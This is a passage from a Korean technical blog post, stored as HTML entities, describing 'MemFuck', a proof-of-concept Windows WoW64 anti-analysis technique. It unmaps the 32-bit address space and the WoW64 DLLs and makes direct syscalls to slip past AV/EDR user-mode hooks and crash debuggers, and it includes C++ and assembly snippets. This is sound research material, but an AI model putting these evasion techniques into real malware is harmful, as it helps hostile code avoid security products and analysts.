&#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. &#xBA87; &#xAC00;&#xC9C0; &#xC874;&#xC7AC;&#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD655;&#xC2E0;&#xD558;&#xC9C0;&#xB9CC; &#xBCF4;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;.</p><h2 id="MemFuck&#xC5D0;-&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"><a href="#MemFuck&#xC5D0;-&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;" class="headerlink" title="MemFuck&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"></a>MemFuck&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xBA70;</h2><p>Memfuck&#xC740; &#xC624;&#xC9C1; PoC&#xC774;&#xBA70; production code&#xC640; &#xC720;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;. &#xC989; &#xD544;&#xC790;&#xB294; &#xC720;&#xC800; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xAC15;&#xB825;&#xD55C; anti-analysis &#xAE30;&#xC220;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD55C;&#xB2E4;.</p><p>MemFuck&#xC740; &#xB2E4;&#xB978; anti-analysis &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC2E4;&#xD5D8;&#xC744; &#xC2DC;&#xC791;&#xD588;&#xB2E4;. &#xBCF8;&#xC9C8;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xB2A5;&#xD55C; &#xD55C; &#xBE44;&#xC5B4;&#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE38; &#xC6D0;&#xD588;&#xC73C;&#xBBC0;&#xB85C; DLL&#xC774;&#xB098; &#xC258; &#xCF54;&#xB4DC;&#xC758; &#xC218;&#xC815; &#xC5C6;&#xC774; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC744; attach &#xD560; &#xC218; &#xC5C6;&#xC5C8;&#xB2E4;. &#xD544;&#xC790;&#xB294; 2008&#xB144;&#xC5D0; &#xC774; <a href="https://gynvael.coldwind.pl/?id=93">&#xAC8C;&#xC2DC;&#xAE00;</a>&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB294;&#xB370; &#xB9E4;&#xC6B0; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xB2E4;. &#xBB3C;&#xB860; 32&#xBE44;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0; XP&#xC5D0;&#xC11C; &#xB9CE;&#xC740; &#xBCC0;&#xD654;&#xAC00; &#xC788;&#xC5C8;&#xC73C;&#xBBC0;&#xB85C; &#xB9CE;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xD638;&#xD658;&#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAC1C;&#xB150;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;.</p><p><img src="/2021/01/10/idioth/memfuck/image2.png" alt></p><p>&#xBB34;&#xC5C7;&#xC774; ntdll&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xB294;&#xAC00;? &#xBAA8;&#xB4E0; &#xACB0;&#xACFC;&#xB294; &#xD2B9;&#xC815;&#xD55C; DLL&#xC5D0; &#xC758;&#xC874;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB97C; &#xB9DD;&#xCCD0;&#xBC84;&#xB9AC;&#xBA74; &#xC5B4;&#xB5A0;&#xD55C; &#xC77C;&#xC774; &#xC77C;&#xC5B4;&#xB0A0;&#xAE4C;</p><h2 id="Unmap-Everything"><a href="#Unmap-Everything" class="headerlink" title="Unmap Everything"></a>Unmap Everything</h2><p>MemFuck&#xC740; 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xAC83;&#xC744; unmap &#xD558;&#xB294; &#xAC83;&#xC5D0; &#xC758;&#xD574; &#xC2DC;&#xC791;&#xB41C;&#xB2E4;. &#xBB3C;&#xB860; PEB/PEB64, TEB/TEB64&#xC640; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA</a> (&#xC791;&#xB144;&#xC5D0; &#xB9C8;&#xCE68;&#xB0B4; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC5C8;&#xB2E4;) &#xAC19;&#xC774; &#xD574;&#xC81C;&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xB4E4;&#xB3C4; &#xC788;&#xB2E4;. &#xC774;&#xC5D0; &#xB300;&#xD574; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xAC00;&#xB2A5;&#xD55C; &#xADC0;&#xCC2E;&#xC9C0; &#xC54A;&#xC740; &#xBC29;&#xBC95;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0; &#xC2F6;&#xC5C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xBAA8;&#xB4E0; &#xAC83;&#xC5D0; NtUnmapViewOfSection&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; x86 &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xADF8;&#xB807;&#xAC8C; ntdll&#xC744; unmap &#xD558;&#xBA74; &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xC77C;&#xC5B4;&#xB0A0;&#xAE4C;? Ntdll&#xC740; &#xC790;&#xAE30; &#xC790;&#xC2E0;&#xC744; unmap &#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xC774; &#xBC29;&#xBC95;&#xC740; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD544;&#xC790;&#xB294; code segment switching(Heaven&#x2019;s Gate)&#xC744; &#xD1B5;&#xD574; &#xC9C1;&#xC811; syscall &#xD638;&#xCD9C;&#xC744; &#xC2DC;&#xD5D8;&#xD574;&#xBCF4;&#xC558;&#xB2E4;. 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; 64&#xBE44;&#xD2B8; syscall &#xC2E4;&#xD589;&#xC740; &#xCDA9;&#xBD84;&#xD788; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xBC29;&#xBC95;&#xC740; &#xBA87; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xC774;&#xC0C1;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><ul><li>32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; &#xB9E4;&#xD551;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC26C;&#xC6B8; &#xAC83;&#xC774;&#xB2E4;.</li><li>64&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC740; &#xC5EC;&#xC804;&#xD788; &#xC190;&#xC0C1;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xB2E4;.</li><li>&#xC774; &#xAE30;&#xC220;&#xC740; user-mode hook&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xD6A8;&#xACFC;&#xC801;&#xC774;&#xC9C0;&#xB9CC; &#xC774;&#xBBF8; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</li></ul><p>&#xC804;&#xBD80;&#xB294; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; &#xB300;&#xBD80;&#xBD84; Ring3 hook&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; AV/EDR &#xC5C5;&#xCCB4;&#xB4E4;&#xC740; &#xD558;&#xB098;&#xC758; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xAC00;&#xC815;&#xC744; &#xD55C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD55C;&#xB2E4;. WoW64 &#xC704;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB294; 32&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; 4GB&#xB85C; &#xC81C;&#xD55C;&#xB41C; &#xC8FC;&#xC18C; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC9C4;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB9E4;&#xD551;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xB354; &#xB9CE;&#xC774; &#xBC30;&#xCE58;&#xD558;&#xACE0; &#xAE30;&#xB2A5;&#xC744; &#xACC4;&#xC18D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC774; &#xC81C;&#xD55C; &#xC774;&#xC0C1;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xBCF4;&#xC790;. Alex Ionescu&#xC5D0; &#xB530;&#xB974;&#xBA74; <a href="https://twitter.com/aionescu/status/677599528409677824?lang=en">&#xC774;&#xAC83;&#xC740; &#xAC00;&#xB2A5;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;</a>. &#xADF8;&#xB7EC;&#xB098; Petr Benes&#xC640; &#xC598;&#xAE30;&#xD55C; &#xD6C4; &#xADF8;&#xB294; &#xCD5C;&#xADFC; &#xBC84;&#xC804;&#xC758; &#xC708;&#xB3C4;&#xC6B0;10&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC81C;&#xD55C;&#xC774; &#xD574;&#xC81C;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD55C;&#xB2E4;. &#xC708;&#xB3C4;&#xC6B0;10 Build 19041.508&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD588;&#xB2E4;.</p><p>64&#xBE44;&#xD2B8; &#xBC84;&#xC804;&#xC758; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a> &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC704;&#xD574; <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf&#x2019;s wow64ext</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;. &#xD544;&#xC790;&#xAC00; &#xCC98;&#xC74C; &#xD638;&#xCD9C;&#xC744; &#xC2DC;&#xB3C4;&#xD588;&#xC744; &#xB54C; &#xD63C;&#xB780;&#xC2A4;&#xB7EC;&#xC6B4; &#xACB0;&#xACFC;&#xB97C; &#xBD24;&#xB2E4;. BaseAddress &#xC694;&#xCCAD;&#xC774; Null&#xC774;&#xBA74; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xD560; &#xC704;&#xCE58;&#xB97C; &#xACB0;&#xC815;&#xD55C;&#xB2E4;. &#xBB3C;&#xB860; &#xC708;&#xB3C4;&#xC6B0;&#xB294; &#xC6B0;&#xB9AC;&#xAC00; &#xC788;&#xC5B4;&#xC11C;&#xB294; &#xC548; &#xB418;&#xB294; &#xACF3;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; 64&#xBE44;&#xD2B8; &#xD638;&#xCD9C;&#xC740; 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC5D0; &#xC798; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;. ZeroBit &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xB9DD;&#xCE58;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB5A8;&#xAE4C;? &#xD544;&#xC790;&#xB294; ZeroBit &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC870;&#xC791;&#xD574;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; request &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC124;&#xBA85;&#xD558;&#xB294; <a href="https://stackoverflow.com/questions/50429365/what-is-the-most-reliable-portable-way-to-allocate-memory-at-low-addresses-on">stackoverflow &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC744; &#xCC3E;&#xC558;&#xB2E4;. &#xB2E4;&#xC2DC; &#xD544;&#xC790;&#xB294; ZeroBit &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC; 64&#xBE44;&#xD2B8; NtAllocateVirtual request&#xC5D0; MEM_TOP_DOWN &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xBCF4;&#xC558;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC0B4;&#xC9DD; &#xB192;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C;&#xB97C; &#xB9CC;&#xB0AC;&#xB2E4;. &#xC774; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC870;&#xC791;&#xD558;&#xB294; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xC5BB;&#xC5C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xC790;! &#xD544;&#xC790;&#xB294; BaseAddress&#xB97C; 64&#xBE44;&#xD2B8; &#xC8FC;&#xC18C;(&#xB9CE;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; 3&#xAC1C;&#xC758; DLL)&#xB85C; &#xC124;&#xC815;&#xD588;&#xACE0; &#xB180;&#xB78D;&#xAC8C;&#xB3C4; &#xADF8; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB410;&#xB2E4;.</p><p><img src="/2021/01/10/idioth/memfuck/image3.png" alt></p><p>&#xBB3C;&#xB860; &#xC5EC;&#xAE30;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD574;&#xC57C; &#xD560; &#xAC83;&#xC740; &#xC5EC;&#xAE30;&#xC5D0; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC368;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xD589;&#xB3D9;&#xC774; &#xC77C;&#xC5B4;&#xB098;&#xB294;&#xC9C0; &#xBCF4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. <a href="https://github.com/jackullrich/ShellcodeStdio">ShellcodeStdio</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBE60;&#xB974;&#xACE0; &#xC27D;&#xAC8C; 64&#xBE44;&#xD2B8; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD588;&#xB2E4;. &#xC774; &#xC258; &#xCF54;&#xB4DC;&#xB294; 64&#xBE44;&#xD2B8; &#xACF5;&#xAC04;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xACE0; &#xC4F0;&#xC774;&#xBA70; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; 32&#xBE44;&#xD2B8; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC758; &#xBAA8;&#xB4E0; &#xAC83;&#xC5D0; unmap&#xC744; &#xC2DC;&#xB3C4;&#xD55C;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC2DC;&#xB3C4;&#xC5D0; &#xB300;&#xD55C; &#xC218;&#xB3C4; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xB2E4;.</p><pre><code class="hljs cpp">DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtUnmapViewOfSection);DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtProtectVirtualMemory);<span class="hljs-keyword">for</span> (DWORD m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">0x80000000</span>; m += <span class="hljs-number">0x1000</span>)    {      PVOID ptrToProtect = (PVOID)m;      ULONG dwBytesToProtect = <span class="hljs-number">1</span>;      ULONG dwOldProt = <span class="hljs-number">0</span>;      NtProtectVirtualMemory((HANDLE)<span class="hljs-number">-1</span>, &amp;ptrToProtect, &amp;dwBytesToProtect, PAGE_READWRITE, &amp;dwOldProt);      NtUnmapViewOfSection((HANDLE)<span class="hljs-number">-1</span>, (PVOID)m);    }</code></pre><p><img src="/2021/01/10/idioth/memfuck/image4.png" alt></p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5C9;&#xB9DD;&#xC774;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC5EC;&#xC804;&#xD788; &#xCF54;&#xB4DC;&#xB294; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xB2E4;. anti-analysis&#xC744; &#xD558;&#xAE30;&#xC5D0; &#xC0C1;&#xB2F9;&#xD788; &#xC88B;&#xC740; &#xD658;&#xACBD;&#xC774;&#xB2E4;. 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC758; &#xC644;&#xC804;&#xD55C; &#xC81C;&#xC5B4;&#xB97C; &#xAC16;&#xACE0; &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC2E4;&#xD788; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC5B8;&#xB85C;&#xB4DC; &#xD560; &#xC218; &#xC788;&#xB2E4;. OllyDbg&#xC640; x64dbg &#xAC19;&#xC740; &#xB9CE;&#xC740; &#xB514;&#xBC84;&#xAC70;&#xB4E4;&#xC740; &#xC5EC;&#xAE30;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB098;&#xC11C; &#xBD84;&#xC11D;&#xC744; &#xACC4;&#xC18D;&#xD558;&#xAE30; &#xC704;&#xD574; Windbg&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;.</p><h2 id="An-Interstring-Intermission"><a href="#An-Interstring-Intermission" class="headerlink" title="An Interstring Intermission"></a>An Interstring Intermission</h2><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; 32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xC601;&#xC5ED;&#xC744; &#xC644;&#xC804;&#xD788; &#xC9C0;&#xC6CC;&#xBC84;&#xB9AC;&#xBA74;&#xC11C; &#xCF54;&#xB4DC;&#xB294; &#xC758;&#xB3C4;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB3D9;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xBAA9;&#xD45C;&#xC5D0; &#xAC70;&#xC758; &#xC131;&#xACF5;&#xD588;&#xC5C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xACF5;&#xACA9;&#xC801;&#xC778; &#xACB0;&#xACFC;&#xC640; &#xBC29;&#xC5B4;&#xC801;&#xC778; &#xACB0;&#xACFC;&#xAC00; &#xAC19;&#xC774; &#xC788;&#xB2E4;. &#xC544;&#xB9C8; &#xC774; &#xAE30;&#xAC04; &#xB3D9;&#xC548; &#xAC00;&#xC7A5; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC0AC;&#xC2E4; &#xC911; &#xD558;&#xB098;&#xB294; <a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/exception-handling-under-wow64">MSDN &#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xC744; &#xB54C;&#xC774;&#xB2E4;.</p><blockquote><p>WOW64&#xB294; x86 &#xC608;&#xC678;&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xC1A1;&#xC73C;&#xB85C; native x64, ia64 &#xB610;&#xB294; ARM64 &#xC608;&#xC678;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; WOW64&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; 32&#xBE44;&#xD2B8; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xD3EC;&#xCC29;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC608;&#xC678;&#xB294; native 64&#xBE44;&#xD2B8; &#xC608;&#xC678;&#xCC98;&#xB7FC; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p></blockquote><p>4GB &#xACBD;&#xACC4; &#xC704;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; 64&#xBE44;&#xD2B8; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xB294;&#xB370;, 64&#xBE44;&#xD2B8; &#xACF5;&#xAC04;&#xC5D0; 64&#xBE44;&#xD2B8; &#xBCA1;&#xD130; &#xC608;&#xC678; &#xCC98;&#xB9AC;&#xAE30;(Vectored Exception Handler)&#xB97C; &#xC124;&#xCE58;&#xD558;&#xBA70; 32&#xBE44;&#xD2B8; &#xC608;&#xC678;&#xC5D0; &#xC758;&#xD574; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xACE0; Control Flow&#xAC00; 64bit VEH&#xC5D0; &#xC758;&#xD574; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158; &#xB41C;&#xB2E4;.</p><p><img src="/2021/01/10/idioth/memfuck/image5.png" alt></p><p>32&#xBE44;&#xD2B8; ntdll&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC81C;&#xB300;&#xB85C; &#xB410;&#xC74C;&#xC744; &#xD655;&#xC2E0;&#xD588;&#xB2E4;. &#xBAA8;&#xB4E0; &#xAC83;&#xC774; unmap &#xB41C; &#xC608;&#xC678;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC27D;&#xC9C0;&#xB9CC; &#xCC98;&#xB9AC;&#xD560; WoW64 &#xB808;&#xC774;&#xC5B4;&#xB85C; &#xC804;&#xD658;&#xD560; &#xCF54;&#xB4DC;&#xAC00; &#xC5C6;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC5D0;&#xB294; &#xB9CE;&#xC740; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC7A0;&#xC7AC;&#xB825;&#xC774; &#xC788;&#xB2E4;.</p><h2 id="Ntdll-No-More"><a href="#Ntdll-No-More" class="headerlink" title="Ntdll No More"></a>Ntdll No More</h2><p>&#xB354; &#xC774;&#xC0C1; &#xC5B4;&#xB5A4; &#xBAA9;&#xC801;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB4E0; ntdll&#xC5D0; &#xC758;&#xC874;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xC6D0;&#xB798; &#xAC1C;&#xB150;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xC11C; WoW64 &#xACC4;&#xCE35;&#xC5D0; &#xB0A8;&#xC740; 3&#xAC1C;&#xC758; dll&#xC744; unmapping &#xD558;&#xB294; &#xC77C;&#xC774; &#xB0A8;&#xC558;&#xB2E4;. WoW64&#xB294; &#xB300;&#xBD80;&#xBD84; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xAC70;&#xC758; &#xB3D9;&#xC77C;&#xD558;&#xB2E4;.(WoW64.dll, wow64win.dll, ntdll.dll)</p><p><img src="/2021/01/10/idioth/memfuck/image6.png" alt></p><p>32&#xBE44;&#xD2B8; &#xCF54;&#xB4DC;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB2C8; &#xB354; &#xC774;&#xC0C1; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774; dll&#xB4E4;&#xC744; unmap &#xD558;&#xC790;.</p><pre><code class="hljs cpp">DWORD64 addrWoW64 = <span class="hljs-number">0</span>;  DWORD64 addrWoW64Win = <span class="hljs-number">0</span>;  DWORD64 addrNtdll = <span class="hljs-number">0</span>;  PPEB peb64 = getPEB();  LIST_ENTRY* first = peb64-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;  LIST_ENTRY* ptr = first;  <span class="hljs-keyword">int</span> cntr = <span class="hljs-number">0</span>;  <span class="hljs-keyword">do</span> {    LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);    ptr = ptr-&gt;Flink;    <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">1</span>) {      addrNtdll = (DWORD64)dte-&gt;DllBase;    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">2</span>) {      addrWoW64 = (DWORD64)dte-&gt;DllBase;    }    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">3</span>) {      addrWoW64Win = (DWORD64)dte-&gt;DllBase;    }    cntr++;  } <span class="hljs-keyword">while</span> (ptr != first);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64Win);</code></pre><p><img src="/2021/01/10/idioth/memfuck/image7.png" alt></p><p>32&#xBE44;&#xD2B8; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xB354; &#xC774;&#xC0C1; hook&#xC740; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; WoW64 dll(Wow64SystemServiceEx &#xB4F1;)&#xC5D0; &#xC788;&#xB294; &#xAC83;&#xB3C4; &#xB2E4; &#xC0AC;&#xB77C;&#xC84C;&#xB2E4;. &#xB0A8;&#xC740; &#xC77C;&#xC740; ntdll&#xC744; unmap &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xBD80;&#xBAA8; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; NtUnmapViewOfSection&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xACBC;&#xB2E4;. &#xC9C1;&#xC811; system call&#xC744; &#xD558;&#xC790;.</p><p>64&#xBE44;&#xD2B8; MSVC &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; inline assembly&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; function ordering, &#xB0B4;&#xBD80; &#xCF54;&#xB4DC; &#xBC30;&#xCE58; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xC778;&#xD574; system call stub&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xD560;&#xB2F9;&#xD558;&#xAE30;&#xB85C; &#xACB0;&#xC815;&#xD588;&#xB2E4;. &#xC708;&#xB3C4;&#xC6B0; 10 64&#xBE44;&#xD2B8;&#xC758; Syscall stub&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xB2E4;.</p><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, xxh<span class="hljs-keyword">syscall</span><span class="hljs-keyword">retn</span></code></pre><p>NtdllVirtualMemory&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; DWORD by DWORD&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xB77C;. &#xADF8;&#xB9AC;&#xACE0; typedef prototype&#xC744; &#xD560;&#xB2F9;&#xD558;&#xBA74; Nt* &#xD568;&#xC218;&#xB97C; &#xC27D;&#xAC8C; &#xD638;&#xCD9C;&#xD560; &#xC218; 